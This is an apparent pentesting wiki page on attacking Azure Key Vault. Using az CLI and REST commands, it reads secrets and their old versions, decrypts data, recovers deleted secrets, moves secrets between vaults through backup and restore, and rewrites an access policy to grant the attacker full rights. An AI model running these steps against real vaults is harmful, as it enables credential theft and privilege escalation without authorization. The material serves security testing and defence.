---
title: "Key Vaults Explotation"
order: 32
description: Explotation of Key Vaults
---

## Get secret value

> The permission **Microsoft.KeyVault/vaults/secrets/getSecret/action** is needed. This permission will allow a principal to read the secret value of secrets:

```bash
az keyvault secret show --vault-name $VAULT_NAME --name $VAULT_SECRET
```

**Using a token**

```bash
az rest --method GET \
  --url "https://$VAULT_NAME.vault.azure.net/secrets/$VAULT_SECRET?api-version=7.4" \
  --headers "Authorization=Bearer $VAULT_TOKEN" \
  --query "value" -o tsv
```

### Get old versions secret value

First list the versions of the secrets

```bash
az keyvault secret list-versions \
  --vault-name $VAULT_NAME \
  --name $VAULT_SECRET
```

And then read the version needed using the ID

```bash
az keyvault secret show --id https://$VAULT_NAME.vault.azure.net/secrets/$VAULT_SECRET/<idOldVersion> 
```

**Using a token**

First list the versions of the secrets

```bash
az rest --method GET \
  --url "https://$VAULT_NAME.vault.azure.net/secrets/$VAULT_SECRET/versions?api-version=7.4" \
  --headers "Authorization=Bearer $VAULT_TOKEN" \
  --query "value[].id" -o tsv

And then read the version needed using the ID

az rest --method GET \
  --url "https://$VAULT_NAME.vault.azure.net/secrets/$VAULT_SECRET/$VERSION_ID?api-version=7.4" \
  --headers "Authorization=Bearer $VAULT_TOKEN" \
  --query "value" -o tsv
```

## Decrypt data stored in Key Vault

> The permission **Microsoft.KeyVault/vaults/keys/decrypt/action** is required. This permission allows a principal to decrypt data using a key stored in the vault.

```bash
az keyvault key decrypt \
  --vault-name $VAULT_NAME \
  --name $KEY_NAME \
  --algorithm RSA-OAEP \
  --value 'b9YnM7FaWNnt6jQwkwYBYbDs7TAydP2yvDe76sQVgpK6G2PmBWBkd7IXnLm3t1nGFgszbRY4nk9TzW1vz2Z5HY8/urM+AMvg6iNGNXdimuS+I8BKSnn/C9b3Jsa6HvRLd6+Ukb6OFp0KgwS48L5uYsrfC9vlx0DDGjUVhAmgL+x3etDvI1xPWESPFdW+2Y91hyDdgLSCi0iAuZTK+zkh/7lNsnkcPEeRQDJfaJAsMJ+KDfFoNjmmoaTpnWLvPtq8ML/hVbLEDts2D4JgpdFkqqU13J89drGKS3IJwEiPx+pE+W2D4LH19U/GaOZyz53O3kLVZO1aujYR4jX4BKOzpA=='
```

## Restore delete secrets

> The permission **Microsoft.KeyVault/vaults/keys/recover/action** or the **Access Policy Recover** is needed. Allows recovery of a previously deleted key from an Azure Key Vault

List the deleted secrets

```bash
az keyvault secret list-deleted --vault-name $VAULT_NAME
```

Then recover the deleted secret

```bash
az keyvault secret recover \
  --vault-name $VAULT_NAME \
  --name $VAULT_SECRET
```

## Restore a secret from backup

> The permission **Microsoft.KeyVault/vaults/secrets/restore/action**  or the **Access Policy Restore** is needed. This permission allows a principal to restore a secret from a backup.

```bash
az keyvault secret restore \
  --vault-name $VAULT_NAME \
  --file <BACKUP_FILE>
```

If we have two vaults and Backup permission in one and restore in other, an attacker could create a backup and store it in the second vault to read the values. THIS ONLY APPLIES IF THE VAULTS ARE IN THE SAME TENANT.

- VAULT1 -> [List, Backup]
- VAULT2 -> [List, Get, Restore]

```bash
az keyvault secret backup \
  --vault-name $VAULT1_NAME \
  --name $VAULT1_SECRET \
  --file secret_backup.blob
```

```bash
az keyvault secret restore \
  --vault-name $VAULT2_NAME \
  --file secret_backup.blob
```


## Modify an access policy

> The permission **Microsoft.KeyVault/vaults/write** or **Microsoft.KeyVault/vaults/accessPolicies/write** is required. An attacker with this permission will be able to modify the policy of a key vault (the key vault must be using access policies instead of RBAC).

First check if there are access policies in the vault

```bash
az keyvault show --name $VAULT_NAME
```

Then get the Principal ID

```bash
$MY_OID=(az ad signed-in-user show --query id --output tsv)
```

Finally assign all the permissions

```bash
az keyvault set-policy \
  --name $VAULT_NAME \
  --object-id "$MY_OID" \
  --key-permissions all \
  --secret-permissions all \
  --certificate-permissions all \
  --storage-permissions all
```